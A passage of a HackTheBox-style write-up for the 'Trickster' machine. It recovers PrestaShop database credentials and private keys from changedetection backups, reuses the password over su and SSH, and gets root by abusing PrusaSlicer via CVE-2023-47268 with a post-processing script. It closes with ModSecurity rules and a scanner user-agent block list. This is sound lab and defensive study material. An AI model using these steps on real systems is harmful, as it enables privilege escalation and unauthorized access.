oxdf@hacky$ cat b86f1003-3ecb-4125-b090-27e15ca605b9/3855b43e05c02a09c0b63be14f70a8bb.txt
  Hacker News new | past | comments | ask | show | jobs | submit  login
 1.                                                                  Have you ever seen soldering this close? [video] ( youtube.com )
     513 points by zdw 13 hours ago | hide | 91 comments
 2.                                                                  Why wordfreq will not be updated ( github.com/rspeer )
     1595 points by tomthe 1 day ago | hide | 477 comments
 3.                                                                  Is Tor still safe to use? ( torproject.org )
     582 points by Sami_Lehtinen 17 hours ago | hide | 373 comments
 4.                                                                  Comic Mono ( dtinth.github.io )
     373 points by rootforce 15 hours ago | hide | 99 comments
 5.                                                                  An In-Depth Guide to Contrastive Learning: Techniques, Models, and Applications ( myscale.com )
     19 points by Bella-Xiang 2 hours ago | hide | 1 comment
 6.                                                                  ADHD headband treats symptoms in 20 minutes per day ( newatlas.com )
     26 points by ludovicianul 46 minutes ago | hide | 19 comments
 7.                                                                  Remote Book Scanning with 1DollarScan and Optimizing Scanned PDFs ( cyhsu.xyz )
     13 points by firexcy 3 hours ago | hide | 1 comment
 8.                                                                  Llama 3.1 Omni Model ( github.com/ictnlp )
     280 points by taikon 19 hours ago | hide | 35 comments
 9.                                                                  Show HN: ts-remove-unused – Remove unused code from your TypeScript project ( github.com/line )
     54 points by kazushisan 7 hours ago | hide | 23 comments
10.                                                                  Nintendo Files Suit for Infringement of Patent Rights Against Pocketpair, Inc ( nintendo.co.jp )
     271 points by monocasa 11 hours ago | hide | 210 comments
11.                                                                  Aliens and the Enlightenment ( historytoday.com )
     23 points by benbreen 6 hours ago | hide | 14 comments
12.                                                                  Moshi: A speech-text foundation model for real time dialogue ( github.com/kyutai-labs )
     274 points by gkucsko 19 hours ago | hide | 47 comments
13.                                                                  Ruby-SAML pwned by XML signature wrapping attacks ( ssoready.com )
     118 points by ucarion 13 hours ago | hide | 58 comments
14.                                                                  GM electric vehicles can now access Tesla Superchargers ( theverge.com )
     166 points by ivewonyoung 18 hours ago | hide | 188 comments
15.                                                                  J2ME-Loader: J2ME emulator for Android devices ( github.com/nikita36078 )
     66 points by flykespice 12 hours ago | hide | 22 comments
16.                                                                  Diversification is a negative price lunch ( outcastbeta.com )
     5 points by sebg 2 hours ago | hide | discuss
17.                                                                  Interning in Go ( medium.com/google-cloud )
     129 points by todsacerdoti 15 hours ago | hide | 38 comments
18.                                                                  0day Contest for End-of-Life Devices Announced ( districtcon.org )
     254 points by winnona 20 hours ago | hide | 145 comments
19.                                                                  Geometric Search Trees ( g-trees.github.io )
     50 points by fanf2 11 hours ago | hide | 5 comments
20.                                                                  Debugging Behind the Iron Curtain (2010) ( jakepoz.com )
     59 points by edward 12 hours ago | hide | 19 comments
21.                                                                  Ask HN: My son might be blind – how to best support
     165 points by tkuraku 8 hours ago | hide | 59 comments
22.                                                                  A high-performance, zero-overhead, extensible Python compiler using LLVM ( github.com/exaloop )
     193 points by wspeirs 20 hours ago | hide | 65 comments
23.                                                                  Bento: Jupyter Notebooks at Meta ( fb.com )
     206 points by Maro 21 hours ago | hide | 106 comments
24.                                                                  Apple mobile processors are now made in America by TSMC ( timculpan.substack.com )
     1566 points by colinprince 1 day ago | hide | 798 comments
25.                                                                  iOS 18 breaks IMAPS self-signed certs ( developer.apple.com )
     106 points by mmd45 17 hours ago | hide | 120 comments
26.                                                                  OpenTelemetry and vendor neutrality: how to build an observability strategy ( grafana.com )
     101 points by meysamazad 17 hours ago | hide | 22 comments
27.                                                                  The Dune Shell ( adam-mcdaniel.github.io )
     215 points by thunderbong 23 hours ago | hide | 66 comments
28.                                                                  A overview of binaries, ELF, and NoMMU on Linux ( landley.net )
     113 points by oliverkwebb 19 hours ago | hide | 4 comments
29.                                                                  Meticulous (YC S21) is hiring to eliminate UI tests
     14 hours ago | hide
30.                                                                  LinkedIn is now using everyone's content to train their AI tool ( twitter.com/racheltobac )
     369 points by lopkeny12ko 16 hours ago | hide | 200 comments

     More

Guidelines | FAQ | Lists | API | Security | Legal | Apply to YC | Contact

Search:

```

It seems like they contain information from the page where changes are being monitored.

#### Backups

The `Backups` directory has two `.zip` archives:

```

oxdf@hacky$ ls Backups/
changedetection-backup-20240830194841.zip  changedetection-backup-20240830202524.zip

```

The later of the two has the same UUIDs as current:

```

oxdf@hacky$ unzip -l Backups/changedetection-backup-20240830202524.zip 
Archive:  Backups/changedetection-backup-20240830202524.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    12156  2024-08-30 20:25   url-watches.json
       64  2024-08-30 20:21   secret.txt
       51  2024-08-30 20:21   b86f1003-3ecb-4125-b090-27e15ca605b9/history.txt
     1679  2024-08-30 20:21   b86f1003-3ecb-4125-b090-27e15ca605b9/dd25d6c8b666e21ac6e596faa4d4a93d.txt.br
       51  2024-08-30 20:21   bbdd78f6-db98-45eb-9e7b-681a0c60ea34/history.txt
    28498  2024-08-30 20:21   bbdd78f6-db98-45eb-9e7b-681a0c60ea34/ba1fe8fcfb743ba16a136d805c38328f.txt.br
       73  2024-08-30 20:25   url-list.txt
      155  2024-08-30 20:25   url-list-with-tags.txt
---------                     -------
    42727                     8 files

```

The other has a different one:

```

oxdf@hacky$ unzip -l Backups/changedetection-backup-20240830194841.zip 
Archive:  Backups/changedetection-backup-20240830194841.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2024-08-31 04:50   b4a8b52d-651b-44bc-bbc6-f9e8c6590103/
     2605  2024-08-30 19:47   b4a8b52d-651b-44bc-bbc6-f9e8c6590103/f04f0732f120c0cc84a993ad99decb2c.txt.br
       51  2024-08-30 19:47   b4a8b52d-651b-44bc-bbc6-f9e8c6590103/history.txt
       64  2024-05-23 21:47   secret.txt
       74  2024-08-31 04:52   url-list.txt
      115  2024-08-31 04:51   url-list-with-tags.txt
    13691  2024-08-31 04:52   url-watches.json
---------                     -------
    16600                     7 files

```

In this backup, there’s a different URL:

```

oxdf@hacky$ cat url-list-with-tags.txt 
https://gitea/james/prestashop/src/branch/main/app/config/parameters.php ['b0d3330f-11b4-4824-9aa7-d315daa463a2']

```

It’s watching the `parameters.php` file for PrestaShop. On decompressing the `.txt.br` file, it has the contents of that file, with a new user and password for the database:

```

oxdf@hacky$ cat f04f0732f120c0cc84a993ad99decb2c.txt
  This website requires JavaScript.
    Explore Help
    Register Sign In
                james/prestashop
              Watch 1
              Star 0
              Fork 0
                You've already forked prestashop
          Code Issues Pull Requests Actions Packages Projects Releases Wiki Activity
                main
          prestashop / app / config / parameters.php
            james 8ee5eaf0bb prestashop
            2024-08-30 20:35:25 +01:00

              64 lines
              3.1 KiB
              PHP

            Raw Permalink Blame History

                < ? php return array (
                'parameters' =>
                array (
                'database_host' => '127.0.0.1' ,
                'database_port' => '' ,
                'database_name' => 'prestashop' ,
                'database_user' => 'adam' ,
                'database_password' => 'adam_admin992' ,
                'database_prefix' => 'ps_' ,
                'database_engine' => 'InnoDB' ,
                'mailer_transport' => 'smtp' ,
                'mailer_host' => '127.0.0.1' ,
                'mailer_user' => NULL ,
                'mailer_password' => NULL ,
                'secret' => 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog' ,
                'ps_caching' => 'CacheMemcache' ,
                'ps_cache_enable' => false ,
                'ps_creation_date' => '2024-05-25' ,
                'locale' => 'en-US' ,
                'use_debug_toolbar' => true ,
                'cookie_key' => '8PR6s1SCD3cLk5GpvkGAZ4K9hMXpx2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i' ,
                'cookie_iv' => 'fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g' ,
                'new_cookie_key' => 'def000001a30bb7f2f22b0a7790f2268f8c634898e0e1d32444c3a03fbb7f2fb57a73f70e01cf83a38ec5d2ddc1741476e83c45f97f763e7491cc5e002aff47' ,
                'api_public_key' => '-----BEGIN PUBLIC KEY-----
                MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuSFQP3xrZccKbS/VGKMr
                v8dF4IJh9F9NvmPZqiFNpJnBHhfWE3YVM/OrEREGKztkHFsQGUZXFIwiBQVs5kAG
                5jfw+hQrl89+JRD0ogZ+OHUfN/CgmM2eq1H/gxAYfcRfwjSlOh2YzAwpLvwtYXBt
                Scu6QqRAdotokqW2meozijOIJFPFPkpoFKPdVdJ8oslvSt6Kgf39DnBpGIXAqaFc
                QdMdq+1lT9oiby0exyUkl6aJU21STFZ7kCf0Secp2f9NoaKoBwC9m707C2UCNkAm
                B2A2wxf88BDC7CtwazwDW9QXdF987RUzGj9UrEWwTwYEcJcV/hNB473bcytaJvY1
                ZQIDAQAB
                -----END PUBLIC KEY-----
                ' ,
                'api_private_key' => '-----BEGIN PRIVATE KEY-----
                MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC5IVA/fGtlxwpt
                L9UYoyu/x0XggmH0X02+Y9mqIU2kmcEeF9YTdhUz86sREQYrO2QcWxAZRlcUjCIF
                BWzmQAbmN/D6FCuXz34lEPSiBn44dR838KCYzZ6rUf+DEBh9xF/CNKU6HZjMDCku
                /C1hcG1Jy7pCpEB2i2iSpbabdoy34tXwRF0WwGSP785V0nyiyW9K3oqB/f0OcGkY
                hcCpoVxB0x2r7WVP2iJvLR7HJSSXpolTbVJMVnuQJ/RJ5ynZ/02hoqgHAL2bvTsL
                ZQI2QCYHYDbDF/zwEMLsK3BrPANb1Bd0X3ztFTMaP1SsRbBPBgRwlxX+E0Hjvdtz
                K1om9jVlAgMBAAECggEAD5CTdKL7TJVNdRyeZ/HgDcGtSFDt92PD34v5kuo14u7i
                Y6tRXlWBNtr3uPmbcSsPIasuUVGupJWbjpyEKV+ctOJjKkNj3uGdE3S3fJ/bINgI
                BeX/OpmfC3xbZSOHS5ulCWjvs1EltZIYLFEbZ6PSLHAqesvgd5cE9b9k+PEgp50Q
                DivaH4PxfI7IKLlcWiq2mBrYwsWHIlcaN0Ys7h0RYn7OjhrPr8V/LyJLIlapBeQV
                Geq6MswRO6OXfLs4Rzuw1dedDPdDZFdSaef6I2tm4Puq4kB5CzqQ8WfsMiz6zFU/
                UIHnnv9jrqfHGYoq9g5rQWKyjxMTlKA8PnMiKzssiQKBgQDeamSzzG6fdtSlK8zC
                TXHpssVQjbw9aIQYX6YaiApvsi8a6V5E8IesHqDnS+s+9vjrHew4rZ6Uy0uV9p2P
                MAi3gd1Gl9mBQd36Dp53AWik29cxKPdvj92ZBiygtRgTyxWHQ7E6WwxeNUWwMR/i
                4XoaSFyWK7v5Aoa59ECduzJm1wKBgQDVFaDVFgBS36r4fvmw4JUYAEo/u6do3Xq9
                JQRALrEO9mdIsBjYs9N8gte/9FAijxCIprDzFFhgUxYFSoUexyRkt7fAsFpuSRgs
                +Ksu4bKxkIQaa5pn2WNh1rdHq06KryC0iLbNii6eiHMyIDYKX9KpByaGDtmfrsRs
                uxD9umhKIwKBgECAXl/+Q36feZ/FCga3ave5TpvD3vl4HAbthkBff5dQ93Q4hYw8
                rTvvTf6F9900xo95CA6P21OPeYYuFRd3eK+vS7qzQvLHZValcrNUh0J4NvocxVVn
                RX6hWcPpgOgMl1u49+bSjM2taV5lgLfNaBnDLoamfEcEwomfGjYkGcPVAoGBAILy
                1rL84VgMslIiHipP6fAlBXwjQ19TdMFWRUV4LEFotdJavfo2kMpc0l/ZsYF7cAq6
                fdX0c9dGWCsKP8LJWRk4OgmFlx1deCjy7KhT9W/fwv9Fj08wrj2LKXk20n6x3yRz
                O/wWZk3wxvJQD0XS23Aav9b0u1LBoV68m1WCP+MHAoGBANwjGWnrY6TexCRzKdOQ
                K/cEIFYczJn7IB/zbB1SEC19vRT5ps89Z25BOu/hCVRhVg9bb5QslLSGNPlmuEpo
                HfSWR+q1UdaEfABY59ZsFSuhbqvC5gvRZVQ55bPLuja5mc/VvPIGT/BGY7lAdEbK
                6SMIa53I2hJz4IMK4vc2Ssqq
                -----END PRIVATE KEY-----
                ' ,
                ),
                );

                Reference in New Issue View Git Blame Copy Permalink
    Powered by Gitea Version: 1.22.1 Page: 158ms Template: 14ms
      English
        Bahasa Indonesia Deutsch English Español Français Italiano Latviešu Magyar nyelv Nederlands Polski Português de Portugal Português do Brasil Suomi Svenska Türkçe Čeština Ελληνικά Български Русский Українська فارسی മലയാളം 日本語 简体中文 繁體中文（台灣） 繁體中文（香港） 한국어
    Licenses API

```

### Shell

Given that adam is a user on the host, I’ll try that password with `su`, and it works:

```

james@trickster:~$ su - adam
Password: 
adam@trickster:~$

```

It works over SSH as well:

```

oxdf@hacky$ sshpass -p adam_admin992 ssh adam@trickster.htb
adam@trickster:~$

```

## Shell as root

### Enumeration

#### sudo

adam can run `prusaslicer` as root:

```

adam@trickster:~$ sudo -l
Matching Defaults entries for adam on trickster:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User adam may run the following commands on trickster:
    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer

```

That directory in `/opt` has an ELF and a `.3mf` file:

```

adam@trickster:/opt/PrusaSlicer$ file prusaslicer 
prusaslicer: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=30e06184968532b6a9aa36f44ada39e4af0bda56, for GNU/Linux 2.6.32, stripped
adam@trickster:/opt/PrusaSlicer$ file TRICKSTER.3mf 
TRICKSTER.3mf: Zip archive data, at least v2.0 to extract, compression method=deflate

```

If I run the program, I can give it the model and it generates output:

```

adam@trickster:/opt/PrusaSlicer$ sudo ./prusaslicer -s TRICKSTER.3mf
10 => Processing triangulated mesh
10 => Processing triangulated mesh
20 => Generating perimeters
20 => Generating perimeters
30 => Preparing infill
45 => Making infill
30 => Preparing infill
10 => Processing triangulated mesh
20 => Generating perimeters
45 => Making infill
10 => Processing triangulated mesh
20 => Generating perimeters
30 => Preparing infill
45 => Making infill
30 => Preparing infill
45 => Making infill
10 => Processing triangulated mesh
20 => Generating perimeters
30 => Preparing infill
45 => Making infill
65 => Searching support spots
65 => Searching support spots
65 => Searching support spots
65 => Searching support spots
65 => Searching support spots
69 => Alert if supports needed
print warning: Detected print stability issues:

Loose extrusions
Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-Sphere

Collapsing overhang
Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-Sphere

Low bed adhesion
TRICKSTER.HTB, Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-Sphere

Consider enabling supports.
Also consider enabling brim.
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Generating skirt and brim
Failed processing of the output_filename_format template.
Parsing error at line 1: Non-integer index is not allowed to address a vector variable.
{input_filename_base}_{nozzle_diameter[initial_tool]}n_{layer_height}mm_{printing_filament_types}_{printer_model}_{print_time}.gcode
                                       ^

```

It’s erroring out on the output name.

#### Prusa

[PursaSlicer](https://www.prusa3d.com/page/prusaslicer_424/) is the software asscoaited with the Prusa 3D printer, and `.3mf` files are the [3D models files](https://blog.prusa3d.com/3mf-file-format-and-why-its-great_30986/) associated with it.

I’ll exfil the over `scp`:

```

oxdf@hacky$ sshpass -p adam_admin992 scp adam@trickster.htb:/opt/PrusaSlicer/TRICKSTER.3mf .

```

I’ll download `PrusaSlicer` from the link above, and run it, importing the `TRICKSTER.3mf` file:

![image-20240925151342435](/img/image-20240925151342435.png)

There’s not much of interest in the file itself.

### CVE-2023-47268

Searching for vulnerabilities in PrusaSlicer I’ll come across [this post](https://medium.com/@kimelmicah/prusaslicer-exploit-cve-2023-47268-5792f9e11357). It shows how to get arbitrary execution by setting a Post-Processing script in the `.3mf` file.

To exploit this I first need to move PrusaSlicer into “Expert mode”:

![image-20240925152046375](/img/image-20240925152046375.png)

Now there are a lot more options on the “Print Settings” tab. I’ll go to “Output options”. At the bottom is a section called “Post processing scripts”. I’ll add one:

![image-20240925153045510](/img/image-20240925153045510.png)

It took a bit of playing around to get it to not fail, but the error messages were a good hint that it was worth commenting out whatever follows.

I’ll then save the project and upload it to Trickster:

```

oxdf@hacky$ sshpass -p adam_admin992 scp TRICKSTER-mod.3mf adam@trickster.htb:/dev/shm/

```

On Trickster, I’ll run it as root, and it just hangs at the end:

```

adam@trickster:/opt/PrusaSlicer$ sudo ./prusaslicer -s /dev/shm/TRICKSTER-mod.3mf
The following configuration values were substituted when loading " << file << ":
        key = "gcode_label_objects"      loaded = "disabled     substituted = "0"
10 => Processing triangulated mesh
10 => Processing triangulated mesh
20 => Generating perimeters
20 => Generating perimeters
30 => Preparing infill
45 => Making infill
30 => Preparing infill
10 => Processing triangulated mesh
20 => Generating perimeters
45 => Making infill
30 => Preparing infill
10 => Processing triangulated mesh
45 => Making infill
20 => Generating perimeters
10 => Processing triangulated mesh
20 => Generating perimeters
30 => Preparing infill
45 => Making infill
30 => Preparing infill
45 => Making infill
65 => Searching support spots
65 => Searching support spots
65 => Searching support spots
65 => Searching support spots
65 => Searching support spots
69 => Alert if supports needed
print warning: Detected print stability issues:

Loose extrusions
Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-Sphere

Collapsing overhang
Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-Sphere

Low bed adhesion
TRICKSTER.HTB, Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-Sphere

Consider enabling supports.
Also consider enabling brim.
88 => Generating skirt and brim
90 => Exporting G-code to /dev/shm/TRICKSTER.gcode

```

That’s because it’s `bash` waiting for commands:

```

88 => Generating skirt and brim
90 => Exporting G-code to /dev/shm/TRICKSTER.gcode
‍id
uid=0(root) gid=0(root) groups=0(root)

```

I’ll go into `/root` and get the final flag:

```

‍cat root.txt
936793f5************************

```

## Beyond Root - ModSecurity

Something is blocking my requests based on User-Agent header. On the box, I’ll notice that `security2` is one of the enabled modules for Apache:

```

root@trickster:/etc/apache2# ls mods-enabled/
access_compat.load  authn_core.load  authz_user.load  deflate.load  filter.load   mpm_event.conf    proxy.conf       reqtimeout.load  setenvif.conf  unique_id.load
alias.conf          authn_file.load  autoindex.conf   dir.conf      headers.load  mpm_event.load    proxy_fcgi.load  rewrite.load     setenvif.load
alias.load          authz_core.load  autoindex.load   dir.load      mime.conf     negotiation.conf  proxy.load       security2.conf   status.conf
auth_basic.load     authz_host.load  deflate.conf     env.load      mime.load     negotiation.load  reqtimeout.conf  security2.load   status.load

```

I can confirm it’s loaded and running:

```

root@trickster:/etc/modsecurity# apachectl -M | grep security
AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1. Set the 'ServerName' directive globally to suppress this message
 security2_module (shared)

```

There are some custom rules here, as well as the default rule set in `/usr/share/modsecurity-crs`:

```

root@trickster:/etc/apache2# cat mods-enabled/security2.conf | grep -v "#" | grep .
<IfModule security2_module>
    SecDataDir /var/cache/modsecurity
    IncludeOptional /etc/modsecurity/*.conf
    IncludeOptional /usr/share/modsecurity-crs/*.load
    SecRuleEngine On
    SecRule REQUEST_URI "@beginsWith /.git" "id:1000001,phase:1,pass,nolog,ctl:ruleEngine=Off"
    <LocationMatch "^/.*">
        SecRule REQUEST_URI "@beginsWith /shop.trickster.htb/.git" "phase:1,pass,nolog,skip:1,id:1001"
        SecRule REQUEST_HEADERS:X-Forwarded-For "@unconditionalMatch" "phase:2,initcol:ip=%{MATCHED_VAR},pass,nolog,id:1002"
        SecRule IP:ACCESS_COUNT "@gt 100" "phase:2,pause:10,deny,status:503,setenv:RATELIMITED,skip:1,nolog,id:1003"
        SecAction "phase:2,setvar:ip.access_count=+1,pass,nolog,id:1004"
        SecAction "phase:5,deprecatevar:ip.access_count=50/5,pass,nolog,id:1005"
        Header always set Retry-After "10" env=RATELIMITED
    </LocationMatch>
</IfModule>

```

The core rule set (CRS) is located in `/usr/share/modsecurity-crs/rules`:

```

root@trickster:/usr/share/modsecurity-crs/rules# ls
crawlers-user-agents.data                     REQUEST-903.9002-WORDPRESS-EXCLUSION-RULES.conf  REQUEST-931-APPLICATION-ATTACK-RFI.conf               RESPONSE-954-DATA-LEAKAGES-IIS.conf
iis-errors.data                               REQUEST-903.9003-NEXTCLOUD-EXCLUSION-RULES.conf  REQUEST-932-APPLICATION-ATTACK-RCE.conf               RESPONSE-959-BLOCKING-EVALUATION.conf
java-classes.data                             REQUEST-903.9004-DOKUWIKI-EXCLUSION-RULES.conf   REQUEST-933-APPLICATION-ATTACK-PHP.conf               RESPONSE-980-CORRELATION.conf
java-code-leakages.data                       REQUEST-903.9005-CPANEL-EXCLUSION-RULES.conf     REQUEST-934-APPLICATION-ATTACK-NODEJS.conf            restricted-files.data
java-errors.data                              REQUEST-903.9006-XENFORO-EXCLUSION-RULES.conf    REQUEST-941-APPLICATION-ATTACK-XSS.conf               restricted-upload.data
lfi-os-files.data                             REQUEST-905-COMMON-EXCEPTIONS.conf               REQUEST-942-APPLICATION-ATTACK-SQLI.conf              scanners-headers.data
php-config-directives.data                    REQUEST-910-IP-REPUTATION.conf                   REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf  scanners-urls.data
php-errors.data                               REQUEST-911-METHOD-ENFORCEMENT.conf              REQUEST-944-APPLICATION-ATTACK-JAVA.conf              scanners-user-agents.data
php-function-names-933150.data                REQUEST-912-DOS-PROTECTION.conf                  REQUEST-949-BLOCKING-EVALUATION.conf                  scripting-user-agents.data
php-function-names-933151.data                REQUEST-913-SCANNER-DETECTION.conf               RESPONSE-950-DATA-LEAKAGES.conf                       sql-errors.data
php-variables.data                            REQUEST-920-PROTOCOL-ENFORCEMENT.conf            RESPONSE-951-DATA-LEAKAGES-SQL.conf                   unix-shell.data
REQUEST-901-INITIALIZATION.conf               REQUEST-921-PROTOCOL-ATTACK.conf                 RESPONSE-952-DATA-LEAKAGES-JAVA.conf                  windows-powershell-commands.data
REQUEST-903.9001-DRUPAL-EXCLUSION-RULES.conf  REQUEST-930-APPLICATION-ATTACK-LFI.conf          RESPONSE-953-DATA-LEAKAGES-PHP.conf

```

The `REQUEST-913-SCANNER-DETECTION.conf` file has this rule:

```

SecRule REQUEST_HEADERS:User-Agent "@pmFromFile scanners-user-agents.data" \
    "id:913100,\
    phase:2,\
    block,\
    capture,\
    t:none,t:lowercase,\
    msg:'Found User-Agent associated with security scanner',\
    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-reputation-scanner',\
    tag:'paranoia-level/1',\
    tag:'OWASP_CRS',\
    tag:'capec/1000/118/224/541/310',\
    tag:'PCI/6.5.10',\
    ver:'OWASP_CRS/3.3.2',\
    severity:'CRITICAL',\
    setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}',\
    setvar:'ip.reput_block_flag=1',\
    setvar:'ip.reput_block_reason=%{rule.msg}',\
    expirevar:'ip.reput_block_flag=%{tx.reput_block_duration}'"

```

It’s getting data from `scanners-user-agents.data`. This file has a list of user agent strings from various tools including `ffuf` and `nmap`:

```

# Vulnerability scanners, bruteforce password crackers and exploitation tools

# password cracker
# http://sectools.org/tool/hydra/
(hydra)
# vuln scanner
# http://virtualblueness.net/nasl.html
.nasl
# sql injection
# https://sourceforge.net/projects/absinthe/
absinthe
# email harvesting
# dead? 2004
advanced email extractor
# vuln scanner
# http://www.arachni-scanner.com/
arachni/
autogetcontent
# nessus frontend
# http://www.crossley-nilsen.com/Linux/Bilbo_-_Nessus_WEB/bilbo_-_nessus_web.html
# dead? 2003
bilbo
# Backup File Artifacts Checker
# https://github.com/mazen160/bfac
BFAC
# password cracker
# http://sectools.org/tool/brutus/
brutus
brutus/aet
# sql injection
# https://www.notsosecure.com/bsqlbf-v2-blind-sql-injection-brute-forcer/
bsqlbf
# vuln scanner
# http://freecode.com/projects/cgichk dead? 2001
cgichk
# vuln scanner
# https://sourceforge.net/projects/cisco-torch/
cisco-torch
# vuln scanner
# https://github.com/stasinopoulos/commix
commix
# MS FrontPage vuln scanner?
core-project/1.0
# vuln scanner?
crimscanner/
# vuln scanner
datacha0s
# hidden page scanner
# https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
dirbuster
# vuln scanner
# https://sourceforge.net/projects/dominohunter/
domino hunter
# vuln scanner - directory traversal fuzzer
# https://github.com/wireghoul/dotdotpwn
dotdotpwn
email extractor
# vuln scanner
fhscan core 1.
floodgate
# "F-Secure Radar is a turnkey vulnerability scanning and management platform."
F-Secure Radar
get-minimal
# Scanner that looks for existing or hidden web objects
# https://github.com/OJ/gobuster
gobuster
# vuln scanner
gootkit auto-rooter scanner
grabber
# vuln scanner
# https://sourceforge.net/projects/grendel/
grendel-scan
# sql injection
havij
# vuln scanner - path disclosure finder
# http://seclists.org/fulldisclosure/2010/Sep/375
inspath
internet ninja
# vuln scanner
jaascois
# vuln scanner
zmeu
# "Mozilla/5.0 Jorgee", vuln scanner
Jorgee
# port scanner
# https://github.com/robertdavidgraham/masscan
masscan
# vuln scanner
# http://www.severus.org/sacha/metis/
metis
# vuln scanner
morfeus fucking scanner
# sql injection
# https://github.com/dtrip/mysqloit
mysqloit
# vuln scanner
# http://www.nstalker.com/
n-stealth
# vuln scanner
# http://www.tenable.com/products/nessus-vulnerability-scanner
nessus
# vuln scanner
# https://www.netsparker.com/web-vulnerability-scanner/
netsparker
# vuln scanner
# https://cirt.net/Nikto2
nikto
# vuln scanner
nmap nse
nmap scripting engine
nmap-nse
# vuln scanner
# http://www.nsauditor.com/
nsauditor
# vuln scanner
# https://github.com/projectdiscovery/nuclei
Nuclei
# vuln scanner
# http://www.openvas.org/
openvas
# sql injection
# http://www.vealtel.com/software/nosec/pangolin/
pangolin
# web proxy & vuln scanner
# https://sourceforge.net/projects/paros/
paros
# phpmyadmin vuln scanner
# dead 2005?
pmafind
prog.customcrawler
# QQGameHall DoS/Virus/Malware/Adware
# https://twitter.com/bagder/status/1244982556958826496?s=20
QQGameHall
# vuln scanner
# https://www.qualys.com/suite/web-application-scanning/
qualys was
s.t.a.l.k.e.r.
security scan
# vuln scanner
# https://sourceforge.net/projects/springenwerk/
springenwerk
# sql injection
# http://www.sqlpowerinjector.com/
sql power injector
# sql injection
# http://sqlmap.org/
sqlmap
# sql injection
# http://sqlninja.sourceforge.net/
sqlninja
# https://www.cyber.nj.gov/threat-profiles/trojan-variants/sysscan
sysscan
# password cracker
# http://foofus.net/goons/jmk/medusa/medusa.html
teh forest lobster
this is an exploit
# vuln scanner?
toata dragostea
toata dragostea mea pentru diavola
# SQL bot
# http://tools.cisco.com/security/center/viewIpsSignature.x?signatureId=22142&signatureSubId=0
uil2pn
# badly scripted UAs (e.g. User-Agent: User-Agent: foo)
user-agent:
# vuln scannr
# https://subgraph.com/vega/
vega/
# vuln scanner
# dead?
voideye
# vuln scanner
# http://w3af.org/
w3af.sf.net
w3af.sourceforge.net
w3af.org
# site scanner (legacy)
# http://www.robotstxt.org/db/webbandit.html
webbandit
# vuln scanner
# http://www8.hp.com/us/en/software-solutions/webinspect-dynamic-analysis-dast/
webinspect
# site scanner
# http://www.scrt.ch/en/attack/downloads/webshag
webshag
# vuln scanner
# dead?
webtrends security analyzer
# vuln scanner
# https://github.com/hhucn/webvulnscan
webvulnscan
# vuln scanner
# https://github.com/xmendez/wfuzz
Wfuzz
# vuln scanner
# https://github.com/ffuf/ffuf
Fuzz Faster U Fool
# web technology scanner
# https://www.morningstarsecurity.com/research/whatweb
whatweb
# vuln scanner
whcc/
# exploit poc
wordpress hash grabber
# exploit
xmlrpc exploit
# wordpress vuln scanner
# https://wpscan.org/
WPScan
# vuln scanner
# https://github.com/mazen160/struts-pwn
struts-pwn
# Detectify website vulnerability scanner
# https://detectify.com/
Detectify
# ZGrab scanner (Mozilla/5.0 zgrab/0.x)
# https://zmap.io
zgrab

```